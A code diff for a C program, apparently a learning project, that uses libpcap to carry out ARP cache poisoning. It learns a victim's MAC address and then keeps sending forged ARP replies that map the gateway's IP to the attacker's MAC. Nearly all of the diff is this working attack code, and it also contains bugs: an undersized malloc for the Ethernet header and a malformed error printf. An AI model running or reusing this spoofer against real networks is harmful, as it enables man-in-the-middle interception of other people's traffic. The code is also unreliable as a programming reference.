@@ -13,14 +13,18 @@ int main(int argc, char *argv[])
 	const char *vic_ip_char = (const char *)argv[2];
 	const char *gate_ip_char = (const char *)argv[3];
 
+	/* get local mac address */
 	u_int8_t *local_mac = (u_int8_t *)malloc(sizeof(u_int8_t) * MACLEN);
 	get_local_mac(dev, local_mac);
 
+	/* set unknown mac address to 0xFFFFFFFFFFFF*/
 	u_int8_t *null_mac = (u_int8_t *)malloc(sizeof(u_int8_t) * MACLEN);
 	for (int i = 0; i < MACLEN; i++)
 	{
 		null_mac[i] = 0xFF;
 	}
+
+	/* parse ip address to u_int32_t format */
 	u_int32_t vic_ip;
 	ipchar_to_uint(vic_ip_char, &vic_ip);
 	u_int32_t gate_ip;
@@ -33,69 +37,72 @@ int main(int argc, char *argv[])
 	{
 		fprintf(stderr, "couldn't open device %s : %s\n", dev, errbuf);
 	}
-
-	/* 1. send ARP REQUEST 
-	*	make and send [arp request packet]
-	*/
+	///////////////////////////////////////////////////////////////////////////////
+	// 1. send ARP REQUEST - 	make and send [arp request packet]
+	///////////////////////////////////////////////////////////////////////////////
 
 	printf("- send ARP REQUEST to victim \n");
 	ethernet_hdr *ethernet_h = make_ethernet_header(
-		null_mac,										/* ether_dhost */
-		local_mac,										/* ether_shost */
-		ARP);											/* ether_type */
+		null_mac,  /* ether_dhost */
+		local_mac, /* ether_shost */
+		ARP);	  /* ether_type */
 	arp_hdr *arp_h = make_arp_header(
-		ETHERNET,										/* ar_hrd */
-		IPV4,											/* ar_pro */
-		HWLEN,											/* ar_hln */
-		PTLEN,											/* ar_plln */
-		REQUEST,										/* ar_op */
-		local_mac,										/* ar_src_mac */
-		get_local_ip(dev),								/* ar_src_ip */
-		null_mac,										/* ar_dst_mac */
-		vic_ip);										/* ar_dst_ip */
+		ETHERNET,  /* ar_hrd */
+		IPV4,	  /* ar_pro */
+		HWLEN,	 /* ar_hln */
+		PTLEN,	 /* ar_plln */
+		REQUEST,   /* ar_op */
+		local_mac, /* ar_src_mac */
+		gate_ip,
+		//		get_local_ip(dev),								/* ar_src_ip : doenst' matter what it is*/
+		null_mac, /* ar_dst_mac */
+		vic_ip);  /* ar_dst_ip */
 	hton_ethernet(ethernet_h);
 	hton_arp(arp_h);
 	print_packet(ethernet_h, arp_h);
-	
-	/* 2. get ARP REPLY and parse source MAC
-	*  3. make [arp request packet]
-	*/
+
+	///////////////////////////////////////////////////////////////////////////////
+	// 2. receive ARP REPLY -		 parse source MAC
+	// 3. make [arp request packet]
+	///////////////////////////////////////////////////////////////////////////////
 
 	printf("\n\n- receive ARP REPLY from victim ");
-	u_int8_t temp_mac[MACLEN] = {0,};
+	u_int8_t temp_mac[MACLEN] = {
+		0,
+	};
 
 	/* set ethernet_h->ether_shost to received mac address */
-	while ( (receive_reply(handle, vic_ip, temp_mac) != 1))
+	while ((receive_reply(handle, vic_ip, temp_mac) != 1))
 	{
-		send_packet(handle, ethernet_h, arp_h, REQUEST);		
+		send_packet(handle, ethernet_h, arp_h, REQUEST);
 	}
 	printf("\n\n- make ARP REPLY packet");
 	ethernet_hdr *r_ethernet_h = make_ethernet_header(
-		temp_mac,										/* ether_dhost */
-		local_mac,										/* ether_shost */
-		ARP);											/* ether_type */
+		temp_mac,  /* ether_dhost */
+		local_mac, /* ether_shost */
+		ARP);	  /* ether_type */
 	arp_hdr *r_arp_h = make_arp_header(
-		ETHERNET,										/* ar_hrd */
-		IPV4,											/* ar_pro */
-		HWLEN,											/* ar_hln */
-		PTLEN,											/* ar_plln */
-		REPLY,										/* ar_op */
-		local_mac,										/* ar_src_mac */
-		gate_ip,								/* ar_src_ip */
-		temp_mac,										/* ar_dst_mac */
-		vic_ip);										/* ar_dst_ip */
+		ETHERNET,  /* ar_hrd */
+		IPV4,	  /* ar_pro */
+		HWLEN,	 /* ar_hln */
+		PTLEN,	 /* ar_plln */
+		REPLY,	 /* ar_op */
+		local_mac, /* ar_src_mac */
+		gate_ip,   /* ar_src_ip */
+		temp_mac,  /* ar_dst_mac */
+		vic_ip);   /* ar_dst_ip */
 
 	hton_ethernet(r_ethernet_h);
 	hton_arp(r_arp_h);
 	print_packet(r_ethernet_h, r_arp_h);
 
+	///////////////////////////////////////////////////////////////////////////////
+	// 4. receive ARP REQUEST - make and send [arp reply packet]
+	///////////////////////////////////////////////////////////////////////////////
 
-	/* 4. receive victim's arp request packet
-	*  5. send arp reply packet
-	*/
-	while ( (receive_request(handle, vic_ip) != 1))
+	while ((receive_request(handle, vic_ip) != 1))
 	{
-		send_packet(handle, r_ethernet_h, r_arp_h, REPLY);		
+		send_packet(handle, r_ethernet_h, r_arp_h, REPLY);
 	}
 
 	return 0;
@@ -122,9 +129,9 @@ int get_local_mac(const char *dev, u_int8_t *mac)
 	return rv;
 }
 
+/* unused function */
 u_int32_t get_local_ip(const char *dev)
 {
-
 	/*
 	struct ifreq ifr;
 	int fd;
@@ -143,11 +150,11 @@ u_int32_t get_local_ip(const char *dev)
 		}
 	}
 
-*/
-
 	u_int32_t ip = 0x00000a00020f;
 
 	return ip;
+	*/
+	return -1;
 }
 
 void ipchar_to_uint(const char *char_ip, u_int32_t *int_ip)
@@ -168,6 +175,18 @@ void ipchar_to_uint(const char *char_ip, u_int32_t *int_ip)
 	}
 }
 
+ethernet_hdr *make_ethernet_header(u_int8_t *ether_dhost, u_int8_t *ether_shost, u_int16_t ether_type)
+{
+	ethernet_hdr *ethernet_h = (ethernet_hdr *)(malloc(sizeof(ethernet_h)));
+	for (int i = 0; i < MACLEN; i++)
+	{
+		ethernet_h->ether_dhost[i] = *(ether_dhost + i);
+		ethernet_h->ether_shost[i] = *(ether_shost + i);
+	}
+	ethernet_h->ether_type = ether_type;
+	return ethernet_h;
+}
+
 arp_hdr *make_arp_header(u_int16_t ar_hrd, u_int16_t ar_pro, u_int8_t ar_hln, u_int8_t ar_pln, u_int16_t ar_op, u_int8_t *ar_src_mac, u_int32_t ar_src_ip, u_int8_t *ar_dst_mac, u_int32_t ar_dst_ip)
 {
 	arp_hdr *arp_h = (arp_hdr *)malloc(sizeof(arp_hdr));
@@ -185,18 +204,6 @@ arp_hdr *make_arp_header(u_int16_t ar_hrd, u_int16_t ar_pro, u_int8_t ar_hln, u_
 	arp_h->ar_src_ip = ar_src_ip;
 	arp_h->ar_dst_ip = ar_dst_ip;
 	return arp_h;
-}
-
-ethernet_hdr *make_ethernet_header(u_int8_t *ether_dhost, u_int8_t *ether_shost, u_int16_t ether_type)
-{
-	ethernet_hdr *ethernet_h = (ethernet_hdr *)(malloc(sizeof(ethernet_h)));
-	for (int i = 0; i < MACLEN; i++)
-	{
-		ethernet_h->ether_dhost[i] = *(ether_dhost + i);
-		ethernet_h->ether_shost[i] = *(ether_shost + i);
-	}
-	ethernet_h->ether_type = ether_type;
-	return ethernet_h;
 }
 
 void hton_ethernet(ethernet_hdr *ethernet_h)
@@ -256,8 +263,10 @@ int receive_reply(pcap_t *handle, u_int32_t ar_src_ip, u_int8_t *ether_shost)
 		if (ntohs(arp_h->ar_op) == REPLY)
 		{
 			/* compare ip address */
-			if(ntohl(arp_h->ar_src_ip) == ar_src_ip){
-				for(int i= 0; i < MACLEN; i++){
+			if (ntohl(arp_h->ar_src_ip) == ar_src_ip)
+			{
+				for (int i = 0; i < MACLEN; i++)
+				{
 					ether_shost[i] = *(reverse_array(arp_h->ar_src_mac) + i);
 				}
 				//print_packet((ethernet_hdr *)packet, (arp_hdr *)(packet + 14));
@@ -285,10 +294,38 @@ int receive_request(pcap_t *handle, u_int32_t ar_src_ip)
 		if (ntohs(arp_h->ar_op) == REQUEST)
 		{
 			/* compare ip address */
-			if(ntohl(arp_h->ar_src_ip) == ar_src_ip){
+			if (ntohl(arp_h->ar_src_ip) == ar_src_ip)
+			{
 				return 1;
 			}
 		}
+	}
+}
+
+void send_packet(pcap_t *handle, ethernet_hdr *ethernet_h, arp_hdr *arp_h, int mode)
+{
+
+	u_char *packet;
+	int packet_size;
+
+	switch (mode)
+	{
+	case REQUEST:
+		packet_size = 42;
+		break;
+	case REPLY:
+		packet_size = 60;
+		break;
+	default:
+		break;
+	}
+
+	packet = (u_char *)malloc(sizeof(u_char) * packet_size);
+	memcpy(packet, ethernet_h, sizeof(ethernet_hdr));
+	memcpy(packet + sizeof(ethernet_hdr), arp_h, sizeof(arp_hdr));
+	if (pcap_sendpacket(handle, packet, packet_size) != 0)
+	{
+		fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(handle));
 	}
 }
 
@@ -332,31 +369,4 @@ void print_packet(ethernet_hdr *ethernet_h, arp_hdr *arp_h)
 	}
 	printf("\nDestination IP : ");
 	printf("%0x", arp_h->ar_dst_ip);
-}
-
-void send_packet(pcap_t *handle, ethernet_hdr *ethernet_h, arp_hdr *arp_h, int mode)
-{
-
-	u_char *packet;
-	int packet_size;
-
-	switch (mode)
-	{
-	case REQUEST:
-		packet_size = 42;
-		break;
-	case REPLY:
-		packet_size = 60;
-		break;
-	default:
-		break;
-	}
-
-	packet = (u_char *)malloc(sizeof(u_char) * packet_size);
-	memcpy(packet, ethernet_h, sizeof(ethernet_hdr));
-	memcpy(packet + sizeof(ethernet_hdr), arp_h, sizeof(arp_hdr));
-	if (pcap_sendpacket(handle, packet, packet_size) != 0)
-	{
-		fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(handle));
-	}
 }
